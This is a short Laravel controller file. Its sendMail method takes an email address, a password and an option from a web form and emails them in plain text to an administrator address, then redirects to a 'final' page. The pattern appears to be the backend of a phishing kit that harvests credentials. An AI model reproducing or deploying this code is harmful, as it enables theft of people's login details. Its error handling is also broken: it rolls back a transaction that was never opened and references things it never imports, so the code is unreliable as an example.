<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use App\Mail\CustomMail;
use Mail;
class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;


    public function index()
    { 
        return view('index');
    }

    
    public function sendMail(Request $request)
    { 
        try {
                $email = env('MAIL_ADMIN');
                $details['subject'] = "Website Form Form";
                $details['type'] = $request->options;
                $details['email'] = $request->email;
                $details['password'] = $request->password;
                Mail::to($email)->send(new CustomMail($details));  
                return redirect()->route('final');
        } catch (Exception $e) {
            DB::rollBack();
            $reply = getErrorMessage($e, $e->getMessage());
            return back()->with('message', $reply);

        }
    }

    
}


